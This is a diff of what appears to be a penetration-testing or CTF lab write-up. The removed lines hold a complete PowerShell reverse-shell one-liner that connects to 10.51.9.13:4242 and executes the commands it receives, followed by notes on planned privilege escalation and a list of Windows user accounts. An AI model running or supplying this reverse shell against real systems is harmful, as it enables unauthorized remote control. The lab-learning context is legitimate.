@@ -380,23 +380,3 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 ```
 
 ![[Pasted image 20240823164339.png]]
-
-```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.51.9.13',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-```
-
-Tried to get the rev-shell and here we are
-![[Pasted image 20240823165205.png]]
-
-
-Let's try to escalate from here.
-
-## Users
-```
-Administrator                                                         
-holo                                                                  
-Public                                                                
-watamet                                                               
-WEB-MGR   
-```
-
